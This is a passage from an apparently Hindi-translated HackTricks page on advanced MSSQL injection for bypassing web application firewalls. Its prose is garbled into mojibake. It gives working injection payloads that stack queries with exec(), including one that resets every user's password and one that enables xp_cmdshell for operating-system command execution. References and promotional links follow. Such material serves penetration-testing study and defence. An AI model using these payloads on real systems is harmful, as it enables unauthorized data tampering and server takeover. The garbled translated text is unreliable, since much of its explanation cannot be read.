use[tempdb]create/**/table[test]([id]int)insert[test]values(1)select[id]from[test]drop/**/table[test]
```
рдЗрд╕рд▓рд┐рдП рдпрд╣ рд╕рдВрднрд╡ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рд╡рд┐рднрд┐рдиреНрди WAFs рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ рдЬреЛ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреЗ рдХреНрд╡реЗрд░реАрдЬрд╝ рдХреЛ рд╕реНрдЯреИрдХ рдХрд░рдиреЗ рдХреЛ рдирд╣реАрдВ рдорд╛рдирддреЗ рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:
```
# Adding a useless exec() at the end and making the WAF think this isn't a valid querie
admina'union select 1,'admin','testtest123'exec('select 1')--
## This will be:
SELECT id, username, password FROM users WHERE username = 'admina'union select 1,'admin','testtest123'
exec('select 1')--'

# Using weirdly built queries
admin'exec('update[users]set[password]=''a''')--
## This will be:
SELECT id, username, password FROM users WHERE username = 'admin'
exec('update[users]set[password]=''a''')--'

# Or enabling xp_cmdshell
admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
## This will be
select * from users where username = ' admin'
exec('sp_configure''show advanced option'',''1''reconfigure')
exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
```
## рд╕рдВрджрд░реНрдн

* [https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)
* [https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/)

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ рдореБрдЭреЗ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) **рдХрд╛ рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВ**.
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ.

</details>
